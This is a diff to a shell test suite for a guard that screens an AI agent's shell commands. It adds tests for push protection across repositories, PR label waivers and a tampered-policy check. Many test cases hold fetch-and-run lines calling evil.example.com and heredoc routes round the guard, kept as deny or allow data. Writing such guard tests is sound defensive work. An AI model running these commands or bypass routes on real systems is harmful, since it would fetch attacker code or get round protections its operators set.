@@ -57,6 +57,15 @@ make_input() {
   ' "$1"
 }
 
+# The tables never reach the network. A `gh pr create --repo <other>` without a label now reads
+# THAT repository's policy (pr_label_waived), so a table without a `gh` double would ask GitHub.
+# This one answers 404 to everything: no policy anywhere, which keeps the label required. GROUP 4
+# on puts a fuller double in front for the cases that need answers.
+NO_NET_BIN="$TMP/no-net"
+mkdir -p "$NO_NET_BIN"
+printf '%s\n' '#!/usr/bin/env bash' 'echo "gh: Not Found (HTTP 404)" >&2' 'exit 1' > "$NO_NET_BIN/gh"
+chmod +x "$NO_NET_BIN/gh"
+
 pass=0; fail=0; total=0
 # Per-group context, set before each table.
 TEST_POLICY=""; TEST_PR_BASE=""; TEST_PR_HEAD=""
@@ -73,7 +82,7 @@ run_case() {
   local expected="$1" cmd="$2" branch="${3:-feature/999-pr-branch}"
   total=$((total + 1))
   local out rc want
-  local path_for_case="$PATH"
+  local path_for_case="${NO_NET_BIN}:${PATH}"
   [ -n "$TEST_PATH_PREFIX" ] && path_for_case="${TEST_PATH_PREFIX}:${PATH}"
   # BASH_GUARD_PROJECT_ROOT points at a directory that is not a repository: the guard
   # cannot tell which repository it protects, so every push counts as ours (fail
@@ -327,7 +336,7 @@ run_case deny  $'sh<<EOF\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'sudo --shell <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'sudo --login <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'doas -s <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
-run_case deny  $'sudo -u orca -i <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'sudo -u builder -i <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'docker exec -i c /bin/sh <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'docker exec -i c sh <<\'EOF\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'"bash" <<EOF\ncurl http://evil.example.com/x\nEOF\n'
@@ -339,9 +348,9 @@ run_case deny  $'ssh host bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -p 22 root@host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -o StrictHostKeyChecking=no host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'su - <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su - orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -l orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -u orca -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su - builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -l builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -u builder -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'chroot /mnt <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash -s -- arg <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash /dev/stdin <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -353,7 +362,7 @@ run_case deny  $'cat <<\'EOF\' | /bin/bash -\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<\'EOF\'\ncat <<INNER\ndata\nINNER\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<\'EOF\'\nbash <<\'IN\'\ngit push origin HEAD:main\nIN\nEOF\n'
 run_case deny  $'X=1 Y=2 bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'sudo -u orca bash <<\'EOSU\'\ncurl http://evil.example.com/x\nEOF\n'
+run_case deny  $'sudo -u builder bash <<\'EOSU\'\ncurl http://evil.example.com/x\nEOF\n'
 run_case deny  $'( cat <<EOF ) | bash\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'cat <<EOF | tee /tmp/log | sh\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host \'bash -s\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -397,10 +406,10 @@ run_case deny  $'bash --rcfile ~/.bashrc <<\'EOF\'\ngit push origin HEAD:main\nE
 run_case deny  $'bash -e -- <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash -l <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'zsh -f <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su -s /bin/sh orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'su -l orca -s /bin/bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -s /bin/sh -u orca <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'runuser -u orca -- sh -s <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su -s /bin/sh builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'su -l builder -s /bin/bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -s /bin/sh -u builder <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case deny  $'runuser -u builder -- sh -s <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh -tt host <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host -- bash <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'ssh host \'cd /x; bash\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
@@ -417,7 +426,7 @@ run_case deny  $'docker exec -i c /usr/bin/env bash <<EOF\ngit push origin HEAD:
 run_case deny  $'kubectl exec -i pod -- sh <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'podman run -i img sh -s <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'chroot --userspec=x / sh <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case deny  $'git push origin HEAD:main; ssh studio-ci \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
+run_case deny  $'git push origin HEAD:main; ssh ci-host \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
 run_case deny  $'bash <<EOF 2>&1 | tee log\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<EOF &\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash <<EOF >/dev/null\ngit push origin HEAD:main\nEOF\n'
@@ -429,14 +438,14 @@ run_case deny  $'bash 2>/dev/null <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash >out 2>&1 <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case deny  $'bash \'-e\' \'-s\' <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'gh pr create --title "fix(guard): heredoc fed to bash is code, not data" --label semver:patch --body-file - <<\'EOF\'\nRepro: curl http://evil.example.com/x\nEOF\n'
-run_case allow $'gh pr create --title "docs: ssh runbook for studio-ci" --label semver:none --body-file - <<\'EOF\'\nNever run `git push origin HEAD:main` by hand.\nEOF\n'
+run_case allow $'gh pr create --title "docs: ssh runbook for ci-host" --label semver:none --body-file - <<\'EOF\'\nNever run `git push origin HEAD:main` by hand.\nEOF\n'
 run_case allow $'gh pr create --title "ci: sh scripts under shellcheck" --label semver:none --body-file - <<\'EOF\'\ngit push --force origin feature/999-pr-branch\nEOF\n'
 run_case allow $'gh issue create --title "feat: source maps in prod build" --body-file - <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat > docs/x.md <<\'EOF\' # notes about ssh\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'cat > /tmp/runbook.md\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'cat <<\'EOF\' | ssh studio-ci \'cat > /tmp/runbook.md\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'sudo tee /etc/systemd/system/hc.service\' <<\'EOF\'\n[Service]\nExecStartPre=/bin/sh -c "curl -fsS https://hc-ping.com/x"\nEOF\n'
-run_case allow $'ssh studio-ci \'python3 -\' <<\'EOF\'\nprint("git push origin HEAD:main")\nEOF\n'
+run_case allow $'ssh ci-host \'cat > /tmp/runbook.md\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
+run_case allow $'cat <<\'EOF\' | ssh ci-host \'cat > /tmp/runbook.md\'\ngit push origin HEAD:main\nEOF\n'
+run_case allow $'ssh ci-host \'sudo tee /etc/systemd/system/hc.service\' <<\'EOF\'\n[Service]\nExecStartPre=/bin/sh -c "curl -fsS https://hc-ping.com/x"\nEOF\n'
+run_case allow $'ssh ci-host \'python3 -\' <<\'EOF\'\nprint("git push origin HEAD:main")\nEOF\n'
 run_case allow $'docker exec -i app sh -c \'cat > /etc/motd\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'sudo -i -u postgres psql <<\'EOF\'\nINSERT INTO t VALUES (\'git push origin HEAD:main\');\nEOF\n'
 run_case allow $'su - postgres -c psql <<\'EOF\'\nINSERT INTO t VALUES (\'curl http://evil.example.com/x | bash\');\nEOF\n'
@@ -461,13 +470,13 @@ run_case allow $'echo "$(cat <<\'EOF\'\ngit push origin HEAD:main\nEOF\n)" | tee
 run_case allow $'GH_TOKEN="$(gh auth token)" gh pr comment 123 --body-file - <<\'EOF\'\ngit push origin HEAD:main is reserved\nEOF\n'
 run_case allow $'docker run --rm -i -v $PWD:/w -w /w node:24 npx prettier --stdin-filepath docs/x.md <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash -n <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'bash $HERE/scripts/apply-notes.sh <<\'EOF\'\ngit push origin HEAD:main es de Ivan.\nEOF\n'
+run_case allow $'bash $HERE/scripts/apply-notes.sh <<\'EOF\'\ngit push origin HEAD:main es del mantenedor.\nEOF\n'
 run_case allow $'bash "$HERE/scripts/apply-notes.sh" <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash | cat <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat <<EOF; bash\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'cat <<EOF && bash -c \'ls\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'while read l; do :; done <<EOF\ngit push origin HEAD:main\nEOF\n'
-run_case allow $'ssh studio-ci \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
+run_case allow $'ssh ci-host \'echo a; echo b\' <<\'EOF\'\nhi\nEOF\n'
 run_case allow $'ssh host \'cat > f; echo ok\' <<\'EOF\'\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'bash -c \'\' <<EOF\ngit push origin HEAD:main\nEOF\n'
 run_case allow $'crontab - <<\'EOF\'\n0 5 * * * curl http://evil.example.com/x\nEOF\n'
@@ -529,11 +538,13 @@ run_case allow 'echo x > packages/database/src/generated/f.ts'  # no trees confi
 # Every merge case above injects the base, so the real lookup had never been
 # exercised — and it was broken. The hook does not run in the PR's repository
 # (it runs in the session's cwd, or in $CLAUDE_PROJECT_DIR when a repo wires a
-# `cd`), so `gh pr view <n>` without `--repo` resolves the number elsewhere. Measured from the studio repo against a PR in one of the maintainer's
-# other repos: "Could not resolve to a PullRequest with the number of <n>".
+# `cd`), so `gh pr view <n>` without `--repo` resolves the number elsewhere. Measured
+# from one of the maintainer's repos against a PR in another of them: "Could not resolve
+# to a PullRequest with the number of <n>".
 # pr_base_branch fails CLOSED, so it
 # returned the protected branch and EVERY cross-repo merge was denied, whatever
-# the policy said. `agent_may_merge: true` was therefore inert from ~/work.
+# the policy said. `agent_may_merge: true` was therefore inert from any session
+# whose cwd was not the PR's repository.
 #
 # The stub below models exactly that: `gh pr view` answers only when `--repo`
 # is forwarded, and fails the way the real one does when it is not.
@@ -555,7 +566,8 @@ for a in "$@"; do
     *) if [ -n "${want_repo:-}" ]; then repo="$a"; unset want_repo
        elif [ -n "${want_fields:-}" ]; then fields="$a"; unset want_fields
        elif [ -z "$sub1" ]; then sub1="$a"
-       elif [ -z "$sub2" ]; then sub2="$a"; apipath="$a"; fi ;;
+       elif [ -z "$sub2" ]; then sub2="$a"; apipath="$a"
+       elif [ -z "${sel:-}" ]; then sel="$a"; fi ;;
   esac
   i=$((i + 1))
 done
@@ -587,6 +599,19 @@ if [ "$sub1" = "api" ]; then
         # RESERVA sus merges al humano, diga lo que diga la sesion
         owner/reserved-to-human)
           pol='{"agent_may_merge":false,"protected_branch":"main","integration_branch":"develop"}' ;;
+        # permisivo, y su respuesta a `pr view` depende del NUMERO (GROUP 10)
+        owner/by-number)
+          pol='{"agent_may_merge":true,"protected_branch":"main","integration_branch":"develop"}' ;;
+        # sus releases no leen etiquetas: renuncia a exigirla (GROUP 8 y 10)
+        owner/no-labels)
+          pol='{"agent_may_merge":false,"protected_branch":"main","require_pr_label":false}' ;;
+        # destinos de un push desde otra sesion (GROUP 8): su rama protegida, por su politica
+        acme/ajeno-protegido)
+          pol='{"protected_branch":"main","integration_branch":"develop"}' ;;
+        acme/ajeno-tronco)
+          pol='{"protected_branch":"trunk"}' ;;
+        # la API no contesta (ni politica ni 404): no se sabe
+        acme/api-caida) echo "gh: HTTP 502: Bad Gateway" >&2; exit 1 ;;
         # sin politica vendorizada: 404, como el real
         *) echo "gh: Not Found (HTTP 404)" >&2; exit 1 ;;
       esac
@@ -611,6 +636,8 @@ if [ "$sub1" = "pr" ] && [ "$sub2" = "view" ]; then
     owner/product-develop)   printf 'develop\tfeature/123-work'; exit 0 ;;
     # el repo PROPIO del GROUP 7 (repos reales)
     owner/propio)            printf 'develop\tfeature/123-work'; exit 0 ;;
+    # el repo del GROUP 9 (modo publicado): una PR de release, base main
+    acme/fuente)             printf 'main\tfeature/123-work';    exit 0 ;;
     # mismo par de refs, pero su politica reserva el merge al humano
     owner/reserved-to-human) printf 'develop\tfeature/123-work'; exit 0 ;;
     owner/product-main)      printf 'main\tdevelop';             exit 0 ;;
@@ -634,6 +661,15 @@ if [ "$sub1" = "pr" ] && [ "$sub2" = "view" ]; then
     # a release PR that RESOLVES fine: base protected, head long-lived. The
     # deny must name the protected base, not claim the PR was unresolvable.
     owner/exotic-release)    printf 'trunk\tstable';              exit 0 ;;
+    # la respuesta depende del PR pedido, por numero o por URL: 123 va a develop, 456 a main.
+    # Es lo que prueba que el guard juzga EL PR que gh va a mergear, no otra palabra.
+    owner/by-number)
+      n="${sel:-}"; n="${n##*/pull/}"; n="${n%%/*}"
+      case "$n" in
+        123) printf 'develop\tfeature/123-work'; exit 0 ;;
+        456) printf 'main\tfeature/456-work'; exit 0 ;;
+        *) echo "GraphQL: Could not resolve to a PullRequest." >&2; exit 1 ;;
+      esac ;;
     "") echo "GraphQL: Could not resolve to a PullRequest with the number of X." >&2; exit 1 ;;
     *)  echo "GraphQL: Could not resolve to a PullRequest." >&2; exit 1 ;;
   esac
@@ -903,6 +939,11 @@ merge_real deny  "$G7PROPIO" 'GH_REPO=owner/reserved-to-human gh pr merge 5 --sq
 REPOS="$TMP/repos"
 PROJ="$REPOS/proyecto"; WT="$REPOS/wt"; CLON="$REPOS/clon"
 OTRO="$REPOS/otro"; MIXTO="$REPOS/mixto"; SINREMOTO="$REPOS/sin-remoto"
+# Foreign destinations with a policy of their own (served by the `gh` double of GROUP 4), and
+# two local ones: a bare repository whose HEAD commits a policy, and one that commits none.
+AJENO="$REPOS/ajeno"; TRONCO="$REPOS/tronco"; CAIDA="$REPOS/caida"
+BAREPOL="$REPOS/remoto-con-politica.git"; BARESIN="$REPOS/remoto-sin-politica.git"
+LOCPOL="$REPOS/local-con-politica"; LOCSIN="$REPOS/local-sin-politica"
 mkdir -p "$REPOS"
 if ! {
   git_h init -q "$PROJ" &&
@@ -917,7 +958,23 @@ if ! {
     git_h init -q "$MIXTO" &&
     git_h -C "$MIXTO" remote add origin https://github.com/acme/mixto.git &&
     git_h -C "$MIXTO" remote add proyecto git@github.com:acme/proyecto.git &&
-    git_h init -q "$SINREMOTO"
+    git_h init -q "$SINREMOTO" &&
+    git_h init -q "$AJENO" &&
+    git_h -C "$AJENO" remote add origin https://github.com/acme/ajeno-protegido.git &&
+    git_h init -q "$TRONCO" &&
+    git_h -C "$TRONCO" remote add origin git@github.com:acme/ajeno-tronco.git &&
+    git_h init -q "$CAIDA" &&
+    git_h -C "$CAIDA" remote add origin https://github.com/acme/api-caida.git &&
+    git_h init -q "$LOCPOL" &&
+    mkdir -p "$LOCPOL/scripts/hooks" &&
+    printf '{"protected_branch":"main"}\n' > "$LOCPOL/scripts/hooks/guard.policy.json" &&
+    git_h -C "$LOCPOL" add -A && git_h -C "$LOCPOL" commit -q -m policy &&
+    git_h clone -q --bare "$LOCPOL" "$BAREPOL" &&
+    git_h -C "$LOCPOL" remote add origin "$BAREPOL" &&
+    git_h init -q "$LOCSIN" &&
+    git_h -C "$LOCSIN" commit -q --allow-empty -m init &&
+    git_h clone -q --bare "$LOCSIN" "$BARESIN" &&
+    git_h -C "$LOCSIN" remote add origin "$BARESIN"
 } >/dev/null 2>&1; then
   echo "ERROR: could not build the GROUP 8 repositories" >&2
   exit 1
@@ -929,7 +986,7 @@ push_real() {
   local expected="$1" cwd="$2" cmd="$3" out rc want
   total=$((total + 1))
   out="$(cd "$cwd" && make_input "$cmd" | env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE \
-    -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH \
+    -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH PATH="$TMP/bin:$PATH" \
     BASH_GUARD_POLICY="$POL_PRISMA" BASH_GUARD_PROJECT_ROOT="$PROJ" "$GUARD" 2>&1)"
   rc=$?
   if [ "$expected" = "allow" ]; then want=0; else want=2; fi
@@ -996,6 +1053,32 @@ push_real deny "$OTRO" "git --git-dir=$PROJ/.git push origin HEAD"
 push_real deny "$OTRO" "git push --no-verify origin main"
 push_real deny "$OTRO" "git push --force origin otra-rama"
 
+# ANOTHER repository's protected branch is ITS policy's call (`git -C <other repo>`, a URL, a
+# session standing in it). Until 2026-09-30 a foreign push had NO protected branch at all, so a
+# session rooted in one consumer could push straight to another consumer's main. Now the
+# destination's own guard.policy.json decides; one that vendors no policy (acme/otro above: 404)
+# still has none, which is the 2026-08-03 case the exemption was made for. Each pair below is a
+# deny and the allow next to it, so neither "deny every foreign push" nor "ignore the
+# destination" passes.
+push_real deny  "$PROJ" "git -C $AJENO push origin main"
+push_real deny  "$AJENO" "git push origin main"
+push_real deny  "$PROJ" "git -C $AJENO push https://github.com/acme/ajeno-protegido.git HEAD:main"
+push_real deny  "$PROJ" "git -C $AJENO push"
+push_real allow "$PROJ" "git -C $AJENO push origin HEAD:feature/x"
+push_real allow "$AJENO" "git push -u origin feature/x"
+# Its protected branch is whatever IT calls it: `trunk` there, and `main` is just a branch.
+push_real allow "$PROJ" "git -C $TRONCO push origin main"
+push_real deny  "$PROJ" "git -C $TRONCO push origin HEAD:trunk"
+# A policy that cannot be read (the API answers neither the file nor 404): strict default.
+push_real deny  "$PROJ" "git -C $CAIDA push origin main"
+push_real allow "$PROJ" "git -C $CAIDA push origin HEAD:feature/x"
+# A local destination: the policy its HEAD commits (never a working tree), or none.
+push_real deny  "$PROJ" "git -C $LOCPOL push origin HEAD:main"
+push_real allow "$PROJ" "git -C $LOCPOL push origin HEAD:feature/x"
+push_real allow "$PROJ" "git -C $LOCSIN push origin HEAD:main"
+# ...and OUR repository is still ours, whatever another repository says.
+push_real deny  "$AJENO" "git -C $PROJ push origin main"
+
 # The production anchor, with NO override: the protected repository is the one that
 # holds the guard. Vendored into $PROJ like a consumer does; no policy file there, so
 # strict defaults (main protected). $CLAUDE_PROJECT_DIR naming another repository
@@ -1007,7 +1090,7 @@ anchor_real() { # anchor_real <allow|deny> <cwd> <command>
   total=$((total + 1))
   (cd "$cwd" && make_input "$cmd" | env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE \
     -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH -u BASH_GUARD_POLICY -u BASH_GUARD_PROJECT_ROOT \
-    CLAUDE_PROJECT_DIR="$OTRO" "$PROJ/scripts/hooks/bash-guard.sh" >/dev/null 2>&1)
+    PATH="$TMP/bin:$PATH" CLAUDE_PROJECT_DIR="$OTRO" "$PROJ/scripts/hooks/bash-guard.sh" >/dev/null 2>&1)
   rc=$?
   if [ "$expected" = "allow" ]; then want=0; else want=2; fi
   if [ "$rc" -eq "$want" ]; then pass=$((pass + 1)); return 0; fi
@@ -1021,6 +1104,7 @@ anchor_real deny "$WT" "git push origin main"
 anchor_real deny "$OTRO" "git -C $PROJ push origin main"
 anchor_real allow "$PROJ" "git -C $OTRO push origin main"
 anchor_real allow "$OTRO" "git push origin main"
+anchor_real deny "$PROJ" "git -C $AJENO push origin main"
 
 # `require_pr_label: false` waives the label on `gh pr create` for THIS repository's
 # PRs only, proven the same way: --repo, or every remote of the directory gh runs in.
@@ -1029,7 +1113,7 @@ gh_real() {
   local expected="$1" policy="$2" cwd="$3" cmd="$4" out rc want
   total=$((total + 1))
   out="$(cd "$cwd" && make_input "$cmd" | env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE \
-    -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH -u GH_REPO \
+    -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH -u GH_REPO PATH="$TMP/bin:$PATH" \
     BASH_GUARD_POLICY="$policy" BASH_GUARD_PROJECT_ROOT="$PROJ" "$GUARD" 2>&1)"
   rc=$?
   if [ "$expected" = "allow" ]; then want=0; else want=2; fi
@@ -1056,9 +1140,264 @@ gh_real deny "$POL_NOLABEL" "$PROJ" 'GH_REPO=acme/otro gh pr create --title t --
 # The default still requires it, and a label always passes.
 gh_real deny "$POL_PRISMA" "$PROJ" 'gh pr create --title t --body b'
 gh_real allow "$POL_PRISMA" "$OTRO" 'gh pr create --label x --title t --body b'
-# Not knowing which repository this is (the tables above) keeps it required.
+# The waiver belongs to the repository the PR LANDS IN, read from its origin (as a merge reads
+# it): a session that requires the label can open an unlabelled PR in a repository whose policy
+# waives it, and a session that waives it cannot carry the waiver into one that does not.
+gh_real allow "$POL_PRISMA" "$PROJ" 'gh pr create --repo owner/no-labels --title t --body b'
+gh_real allow "$POL_PRISMA" "$OTRO" 'gh pr create -R github.com/OWNER/no-labels --title t --body b'
+gh_real deny "$POL_NOLABEL" "$PROJ" 'gh pr create --repo owner/reserved-to-human --title t --body b'
+gh_real deny "$POL_PRISMA" "$PROJ" 'gh pr create --repo acme/api-caida --title t --body b'
+gh_real deny "$POL_PRISMA" "$PROJ" 'gh pr create --repo "$R" --title t --body b'
+gh_real deny "$POL_PRISMA" "$PROJ" 'gh pr create --repo owner/no-labels --title t --body b $EXTRA'
+gh_real deny "$POL_PRISMA" "$PROJ" 'gh pr create --title t --body b "$@" --repo owner/no-labels'
+# Not knowing which repository this is keeps it required. (The tables' BASH_GUARD_OWN_REPO
+# stands for "this repository, and the cwd is it"; empty, it knows nothing.)
 TEST_POLICY="$POL_NOLABEL"; TEST_PR_BASE=""; TEST_PR_HEAD=""; TEST_PATH_PREFIX=""
+TEST_OWN_REPO=""
 run_case deny 'gh pr create --title t --body b'
+TEST_OWN_REPO="owner/the-session-repo"
+
+# ============================================================================
+# GROUP 9 — PUBLISHED mode (`--project <dir>`): the policy is the one origin's
+# default branch carries, never the working tree's, and the protected repository
+# is <dir>, never the directory the guard lives in.
+#
+# This is how the guard runs in its own source repository (source-guard.sh runs
+# the plugin cache's copy). The working tree below holds a TAMPERED policy — main
+# unprotected, one more host allowed, merges granted — next to the REVIEWED one on
+# origin/HEAD; every case that reads the policy has a verdict that only the
+# reviewed one gives. And the guard under test lives in THIS checkout, a real
+# repository with other remotes: a --project that fell back to $HERE would make
+# every push from $OTRO "foreign" and let it through.
+#
+# No override of branch, policy or identity: the anchor, the policy and the branch
+# resolve for real. The fake `gh` of GROUP 4 stands in front of the real one, so no
+# case can reach the network (it answers 404 to any policy it does not know).
+# ============================================================================
+PUB="$REPOS/fuente"; PUB_NOHEAD="$REPOS/fuente-sin-head"
+POL_REVIEWED='{ "agent_may_merge": false, "protected_branch": "main", "integration_branch": "develop",
+  "egress_allow": ["localhost", "127.0.0.1", "::1", "reviewed.example"] }'
+POL_TAMPERED='{ "agent_may_merge": true, "protected_branch": "nada", "integration_branch": "develop",
+  "egress_allow": ["localhost", "127.0.0.1", "::1", "tampered.example"] }'
+if ! {
+  git_h init -q "$PUB" &&
+    git_h -C "$PUB" remote add origin https://github.com/acme/fuente.git &&
+    mkdir -p "$PUB/scripts/hooks" &&
+    printf '%s\n' "$POL_REVIEWED" > "$PUB/scripts/hooks/guard.policy.json" &&
+    git_h -C "$PUB" add -A && git_h -C "$PUB" commit -q -m reviewed &&
+    git_h -C "$PUB" update-ref refs/remotes/origin/develop HEAD &&
+    git_h -C "$PUB" symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/develop &&
+    git_h -C "$PUB" switch -q -c feature/pub &&
+    printf '%s\n' "$POL_TAMPERED" > "$PUB/scripts/hooks/guard.policy.json" &&
+    git_h init -q "$PUB_NOHEAD" &&
+    git_h -C "$PUB_NOHEAD" remote add origin https://github.com/acme/fuente-sin-head.git &&
+    git_h -C "$PUB_NOHEAD" commit -q --allow-empty -m init
+} >/dev/null 2>&1; then
+  echo "ERROR: could not build the GROUP 9 repositories" >&2
+  exit 1
+fi
+printf '%s\n' "$POL_REVIEWED" > "$TMP/api-reviewed.json"
+
+# pub_real <allow|deny> <cwd> <project> <command> [VAR=value ...]
+pub_real() {
+  local expected="$1" cwd="$2" project="$3" cmd="$4" out rc want
+  shift 4
+  total=$((total + 1))
+  out="$(cd "$cwd" && make_input "$cmd" | env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE \
+    -u GIT_COMMON_DIR -u BASH_GUARD_BRANCH -u BASH_GUARD_POLICY -u BASH_GUARD_PROJECT_ROOT \
+    -u BASH_GUARD_OWN_REPO -u BASH_GUARD_PR_BASE -u BASH_GUARD_PR_HEAD -u BASH_GUARD_TARGET_POLICY \
+    -u CLAUDE_PROJECT_DIR PATH="$TMP/bin:$PATH" "$@" "$GUARD" --project "$project" 2>&1)"
+  rc=$?
+  if [ "$expected" = "allow" ]; then want=0; else want=2; fi
+  if [ "$rc" -eq "$want" ]; then pass=$((pass + 1)); return 0; fi
+  fail=$((fail + 1))
+  printf 'FAIL  expected=%s (exit %d), got exit %d  [published, project=%s, cwd=%s]  ::  %s\n' \
+    "$expected" "$want" "$rc" "${project#"$REPOS"/}" "${cwd#"$REPOS"/}" "$cmd"
+  [ -n "$out" ] && printf '      output: %s\n' "$out"
+  return 0
+}
+# The reviewed policy governs; the tampered working tree does not.
+pub_real deny  "$PUB" "$PUB" 'git push origin main'
+pub_real deny  "$PUB" "$PUB" 'curl https://tampered.example'
+pub_real deny  "$PUB" "$PUB" 'gh pr merge 5 --repo acme/fuente --squash'
+# ...and it IS read, not merely defaulted: its extra host passes.
+pub_real allow "$PUB" "$PUB" 'curl https://reviewed.example'
+pub_real allow "$PUB" "$PUB" 'git push -u origin HEAD'
+# The protected repository is --project, wherever the agent stands.
+pub_real allow "$OTRO" "$PUB" 'git push origin main'
+pub_real deny  "$OTRO" "$PUB" "git -C $PUB push origin main"
+# No origin/HEAD: the API (BASH_GUARD_TARGET_POLICY stands for it) and, failing
+# that, strict defaults — never the fixture next to the guard, never an allow-all.
+pub_real allow "$PUB_NOHEAD" "$PUB_NOHEAD" 'curl https://reviewed.example' BASH_GUARD_TARGET_POLICY="$TMP/api-reviewed.json"
+pub_real deny  "$PUB_NOHEAD" "$PUB_NOHEAD" 'curl https://reviewed.example'
+pub_real deny  "$PUB_NOHEAD" "$PUB_NOHEAD" 'git push origin main'
+# A --project that names nothing: no repository is ours, so every push counts as
+# ours, and the defaults apply. From $OTRO this is the case that catches a fallback
+# to the guard's own checkout.
+pub_real deny  "$OTRO" "" 'git push origin main'
+pub_real deny  "$OTRO" "$REPOS/no-existe" 'git push origin main'
+pub_real deny  "$PUB" "" 'curl https://reviewed.example'
+# BASH_GUARD_POLICY is TEST-ONLY and still wins (source-guard.sh strips it).
+pub_real deny  "$PUB" "$PUB" 'curl https://reviewed.example' BASH_GUARD_POLICY="$POL_PRISMA"
+
+# ============================================================================
+# GROUP 10 — MENOS FRICCION: lo que el guard denegaba sin motivo, y al lado, en cada
+# caso, el vecino peligroso que sigue denegado. Medido en los transcripts de los 30 dias hasta
+# el 2026-09-30 (320 DENY): 41 por `--label`, 38 merges sin resolver, 202 de egress, 2 plantillas
+# .env. Cada arreglo lleva su pareja: sin la mitad que deniega, un arreglo que apagara la regla
+# entera tambien saldria verde.
+# ============================================================================
+TEST_POLICY="$POL_PRODUCT"; TEST_PR_BASE=""; TEST_PR_HEAD=""; TEST_PATH_PREFIX="$TMP/bin"
+TEST_OWN_REPO="owner/the-session-repo"
+
+# msg_case <substring> <command>: denied, AND for the reason that tells the agent what to do.
+msg_case() {
+  local want="$1" cmd="$2" out rc
+  total=$((total + 1))
+  out="$(make_input "$cmd" | env BASH_GUARD_BRANCH=feature/999-pr-branch BASH_GUARD_POLICY="$TEST_POLICY" \
